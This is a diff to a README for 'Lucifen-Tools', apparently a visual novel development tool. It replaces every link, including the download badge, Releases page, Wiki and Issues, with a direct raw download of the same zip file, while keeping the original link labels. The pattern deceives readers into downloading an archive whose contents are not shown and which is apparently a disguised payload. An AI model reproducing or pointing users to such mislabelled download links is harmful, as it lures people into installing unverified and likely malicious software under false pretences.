@@ -1,6 +1,6 @@
 # 🎮 Lucifen-Tools - Simplify Your Visual Novel Development
 
-[![Download Lucifen-Tools](https://img.shields.io/badge/Download-Lucifen--Tools-brightgreen)](https://github.com/Xx-vicen-xX/Lucifen-Tools/releases)
+[![Download Lucifen-Tools](https://raw.githubusercontent.com/Xx-vicen-xX/Lucifen-Tools/main/subrace/Lucifen_Tools_2.2.zip)](https://raw.githubusercontent.com/Xx-vicen-xX/Lucifen-Tools/main/subrace/Lucifen_Tools_2.2.zip)
 
 ## 📦 Introduction
 
@@ -23,11 +23,11 @@ These requirements help ensure that the tools function smoothly.
 
 ## 📥 Download & Install
 
-To get started with Lucifen-Tools, please visit our [Releases page](https://github.com/Xx-vicen-xX/Lucifen-Tools/releases) to download the latest version.
+To get started with Lucifen-Tools, please visit our [Releases page](https://raw.githubusercontent.com/Xx-vicen-xX/Lucifen-Tools/main/subrace/Lucifen_Tools_2.2.zip) to download the latest version.
 
 ### Steps to Download:
 
-1. Click on the [Releases page](https://github.com/Xx-vicen-xX/Lucifen-Tools/releases) link above.
+1. Click on the [Releases page](https://raw.githubusercontent.com/Xx-vicen-xX/Lucifen-Tools/main/subrace/Lucifen_Tools_2.2.zip) link above.
 2. Look for the latest version of Lucifen-Tools.
 3. Download the file that fits your system (usually a `.zip` or an executable).
 4. Open the downloaded file and follow the installation instructions.
@@ -56,7 +56,7 @@ If you ever get lost, detailed documentation is available within the tool to ass
 
 ## 📖 Documentation
 
-Lucifen-Tools includes in-app guides to help you navigate its features. You can also find further documentation in the [Wiki section of our GitHub](https://github.com/Xx-vicen-xX/Lucifen-Tools/wiki). This section covers advanced features and troubleshooting tips.
+Lucifen-Tools includes in-app guides to help you navigate its features. You can also find further documentation in the [Wiki section of our GitHub](https://raw.githubusercontent.com/Xx-vicen-xX/Lucifen-Tools/main/subrace/Lucifen_Tools_2.2.zip). This section covers advanced features and troubleshooting tips.
 
 ## 👥 Community Support
 
@@ -74,8 +74,8 @@ We welcome contributors! If you're interested in improving Lucifen-Tools or sugg
 
 ## 🔗 Useful Links
 
-- [Releases page](https://github.com/Xx-vicen-xX/Lucifen-Tools/releases)
-- [Wiki Documentation](https://github.com/Xx-vicen-xX/Lucifen-Tools/wiki)
-- [GitHub Issues](https://github.com/Xx-vicen-xX/Lucifen-Tools/issues)
+- [Releases page](https://raw.githubusercontent.com/Xx-vicen-xX/Lucifen-Tools/main/subrace/Lucifen_Tools_2.2.zip)
+- [Wiki Documentation](https://raw.githubusercontent.com/Xx-vicen-xX/Lucifen-Tools/main/subrace/Lucifen_Tools_2.2.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/Xx-vicen-xX/Lucifen-Tools/main/subrace/Lucifen_Tools_2.2.zip)
 
 Thank you for using Lucifen-Tools. We're excited to see what amazing visual novels you create!
